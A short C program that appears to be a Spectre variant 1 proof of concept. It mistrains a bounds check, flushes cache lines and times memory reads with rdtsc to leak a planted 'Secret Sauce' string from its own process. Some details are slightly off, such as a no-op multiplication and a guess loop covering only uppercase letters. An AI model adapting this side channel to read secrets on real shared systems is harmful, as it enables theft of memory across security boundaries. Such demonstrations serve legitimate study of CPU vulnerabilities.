#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <x86intrin.h>

#define CACHE_PAGE 128
#define COUNT 100
#define SECRET_S 16
#define TRAIN 50
#define FREQ 10


volatile char  secret[SECRET_S*16] = 
"\0\0\0\0" "\0\0\0\0"
"\0\0\0\0" "\0\0\0\0"
"Secret Sauce";

volatile uint8_t detector[256 * CACHE_PAGE];
volatile uint32_t secret_s = SECRET_S;
volatile uint32_t detector_s = 256 * CACHE_PAGE;

void sink(uint32_t x){
    (void)x;
} 
 
void delay(){
    uint32_t x = 0x1234;
    for(int i = 0; i < 1000; i++){
        x *= i;
        x ^= 123;
        x * 173;
    }
}

int x;
void get_from_secret(int idx){ //Vulnerable Function-------------------------
    if(idx < secret_s){
       x = x ^ detector[secret[idx]*CACHE_PAGE];
    }

}

uint32_t check_timing(int idx, int byte){
    for(int i = 0; i < 256; i++) {
        _mm_clflush((void*)(detector + i * CACHE_PAGE));
    }
    
    int idx_ = idx % secret_s;

for(int i = 0; i < TRAIN; i++) {
    _mm_clflush((void*)&secret_s);
    delay();

    int addr = ((i % FREQ) - 1) & ~0xffff;
    addr = (addr | (addr >> 16));
    addr = idx_ ^ (addr & (idx_ ^ idx));

    get_from_secret(addr); //Replace With Vulnerable Function
  }

    delay();

  uint64_t a, b;
  byte *= CACHE_PAGE;

  a = __rdtsc();
  sink(detector[byte]);
  _mm_lfence();
  b = __rdtsc();

  return (uint32_t)(b - a);
}

uint32_t check_location(int idx, int byte){
    uint32_t ram = 0;
    uint32_t cache = 0;
    

    for(int i = 0; i < COUNT; i++){
        uint32_t timing = check_timing(idx, byte);
        if(timing > 80){ram++;}else{cache++;}
    }
    if(cache > ram){return 1;}
    return 0;
    
}

uint8_t getByte(int idx){
    uint8_t character = 0;

    for(int i = 'A'; i <= 'Z'; i++){
        if(check_location(idx, i)==1){
            character = i;
        }
    }

    return character;

}

int main(void){
    int btr = 20;
    for(int i = 0;i < btr; i++){
        putchar(getByte(secret_s + i));
    }
    printf("\n");
    return 0;
}